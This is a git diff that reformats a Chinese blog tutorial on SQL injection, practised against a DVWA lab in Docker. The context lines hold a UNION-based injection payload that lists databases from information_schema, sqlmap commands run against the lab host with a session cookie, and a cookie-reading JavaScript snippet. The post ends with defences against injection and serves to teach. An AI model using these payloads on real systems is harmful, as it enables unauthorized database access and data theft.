@@ -27,9 +27,7 @@ image: /assets/img/sql-injection/cover.png
 注入漏洞一直以来都处于[OWASP](https://owasp.org/www-project-top-ten/)榜首  
 我们可以看下该项目对于注入的解释  
 几乎任何数据源都可以是注入向量、环境变量、参数、外部和内部 Web 服务以及所有类型的用户。
-
 当攻击者可以向解释器发送恶意数据时，就会出现注入缺陷。
-
 通过[乌云](http://wooyun.2xss.cc/)我们可以看到现实存在大量注入案例
 
 所谓SQL注入，就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。我们永远不要信任用户的输入，我们必须认定用户输入的数据都是不安全的，我们都需要对用户输入的数据进行过滤处理。  
@@ -43,7 +41,7 @@ image: /assets/img/sql-injection/cover.png
 5、网站挂马：拿到webshell获取服务器权限后，将网页木马挂在服务器上。 
 
 这次我是使用DVWA搭建的靶机来进行SQL注入，DVWA的搭建方式我已经在其他文章详细写过了，这次就不再说明了，不过补充下几点，因为我是使用docker搭建的，我们要测试sql注入，有些操作需要我们进入容器再进行sql测试。  
-```sql
+```shell
 启动容器后，我们先查看
 docker ps   # 查看正在运行的容器 
 确定DVWA的容器id，进入docker容器路径，进入对应id的容器，再启动mysql
@@ -89,7 +87,7 @@ UNION 操作符用于合并两个或多个 SELECT 语句的结果集。
 
 那现在我们就可以来爆数据了，MySQL 自带的信息数据库：
 performance_schema 用于性能分析；
- information_schema 用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。
+information_schema 用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。
 
 1' union select 1,SCHEMA_NAME  from information_schema.SCHEMATA #
 可以爆出系统现有的数据库，再优化下格式
@@ -117,7 +115,7 @@ sqlmap是一个开源的渗透测试工具，可以用来进行自动化检测�
 
 sqlmap支持MySQL, Oracle,PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird,Sybase和SAP MaxDB等数据库的各种安全漏洞检测。
 
-```sql
+```shell
 我们copy注入路径，启动sqlmap
 sqlmap -u "http://192.168.80.128/vulnerabilities/sqli/?id=&Submit=Submit#" 
 -u #注入点
@@ -128,7 +126,7 @@ sqlmap -u "http://192.168.80.128/vulnerabilities/sqli/?id=&Submit=Submit#" --coo
 查询cookie的方法可以使用 javascript:alert(document.cookie) 或fidder 抓包查询
 ```
 ![图例](/assets/img/sql-injection/1.png)
-```sql
+```shell
 sqlmap -u "http://192.168.80.128/vulnerabilities/sqli/?id=&Submit=Submit#"  --cookie="PHPSESSID=is5s61h4atbfmjivb6vcn8ejh3; security=low" --batch --dbs
 可以爆出目标数据库
 available databases [4]:
@@ -160,11 +158,8 @@ sqlmap -u "http://192.168.80.128/vulnerabilities/sqli/?id=&Submit=Submit#"  --co
 
 由此可见sql注入的危害，而目前sql注入的防御方法主要有：  
 代码层面：
-
 1、转义用户输入的内容 
-
 2、限制输入长度 
-
 3、使用sql语句预处理（先将语句进行预编译，参数绑定后再传参）  
 网络层面：部署waf（web防火墙）  
 其他层面：定期进行安全渗透测试
